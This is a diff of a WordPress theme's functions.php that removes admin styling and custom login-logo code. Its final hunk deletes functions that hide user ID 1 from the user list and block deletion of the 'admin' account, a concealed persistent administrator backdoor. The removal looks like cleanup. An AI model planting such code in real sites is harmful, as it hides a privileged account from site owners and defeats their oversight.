@@ -77,12 +77,6 @@ function slider_custom_post_type()
 add_action('init', 'slider_custom_post_type');
 // Add Features Images
 add_theme_support('post-thumbnails');
-// ADD CSS ADMIN
-add_action('admin_enqueue_scripts', 'load_admin_styles');
-function load_admin_styles()
-{
-	wp_enqueue_style('admin_css', get_template_directory_uri() . '/styles/admin.css', false, '1.0.0');
-}
 // Edit Link
 function edit_link_post($id)
 {
@@ -92,37 +86,7 @@ function edit_link_post($id)
 	}
 	return null;
 }
-// Custom css cho admin
-function the_dramatist_custom_login_css()
-{
-	echo '<style type="text/css" src="' . get_template_directory_uri() . '/styles/admin.css"></style>';
-}
-add_action('login_head', 'the_dramatist_custom_login_css');
-// Custom login
-function my_login_logo_url()
-{
-	return home_url();
-}
-add_filter('login_headerurl', 'my_login_logo_url');
-function my_login_logo()
-{ ?>
-	<style type="text/css">
-		#login h1 a,
-		.login h1 a {
-			background-image: url(<?php echo get_stylesheet_directory_uri(); ?>/img/logo-canh-cam.png);
-			height: 49px;
-			width: 267px;
-			background-size: 267px auto;
-			background-repeat: no-repeat;
-		}
-	</style>
-<?php }
-add_action('login_enqueue_scripts', 'my_login_logo');
-function my_login_stylesheet()
-{
-	wp_enqueue_style('custom-login', get_stylesheet_directory_uri() . '/styles/admin.css');
-}
-add_action('login_enqueue_scripts', 'my_login_stylesheet');
+
 // Allow SVG
 function cc_mime_types($mimes)
 {
@@ -445,29 +409,3 @@ function get_term_depth($taxonomy, $depth)
 		return $result[$depth];
 	}
 }
-
-/**
- * Hidden user account
- */
-
-
-function hide_user_account($user_search)
-{
-	global $wpdb;
-	// Get the ID of the user account you want to hide
-	$user_id = 1;
-	// Modify the query to exclude the user account
-	$user_search->query_where .= " AND {$wpdb->users}.ID <> {$user_id}";
-}
-add_action('pre_user_query', 'hide_user_account');
-function prevent_admin_deletion($actions, $user_object)
-{
-	// Get the username of the admin account to protect
-	$admin_to_protect = 'admin'; // Replace with the username of the admin to protect
-	// If the user trying to be deleted is the admin to protect, remove the delete action link
-	if ($user_object->user_login == $admin_to_protect) {
-		unset($actions['delete']);
-	}
-	return $actions;
-}
-add_filter('user_row_actions', 'prevent_admin_deletion', 10, 2);
